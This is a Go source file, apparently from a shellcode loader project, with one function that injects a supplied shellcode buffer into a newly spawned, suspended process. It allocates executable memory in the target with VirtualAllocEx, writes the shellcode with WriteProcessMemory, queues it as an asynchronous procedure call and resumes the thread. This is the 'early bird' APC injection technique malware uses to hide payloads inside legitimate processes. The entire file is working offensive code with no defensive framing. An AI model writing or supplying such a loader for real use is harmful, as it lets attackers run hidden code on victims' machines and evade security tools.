package inject

import (
	"variant/log"
	"variant/xwindows"

	"golang.org/x/sys/windows"
)

func QueueUserAPC(sc []byte, path string) {
	var startupInfo windows.StartupInfo
	var outProcInfo windows.ProcessInformation

	err := windows.CreateProcess(nil,
		windows.StringToUTF16Ptr(path),
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		&startupInfo,
		&outProcInfo)

	if err != nil {
		log.Fatalf("Failed to Create Process: %v", err)
	}

	addr, lastErr := xwindows.VirtualAllocEx(
		outProcInfo.Process,
		uintptr(0),
		uintptr(len(sc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READ,
	)

	if addr == 0 {
		log.Fatalf("VirtualAlloc Failed: %v", lastErr)
	}

	var numberOfBytesWritten uintptr
	err = windows.WriteProcessMemory(outProcInfo.Process, addr, &sc[0], uintptr(len(sc)), &numberOfBytesWritten)
	if err != nil {
		log.Fatalf("Failed to WriteProcessMemory: %v", err)
	}

	QUA, lastErr := xwindows.QueueUserAPC(addr, uintptr(outProcInfo.Thread), 0)
	if QUA == 0 {
		log.Fatalf("QueueUserAPC failed. %v", lastErr)
	}

	_, err = windows.ResumeThread(outProcInfo.Thread)
	if err != nil {
		log.Fatalf("Can't resume thread. %v", err)
	}
}
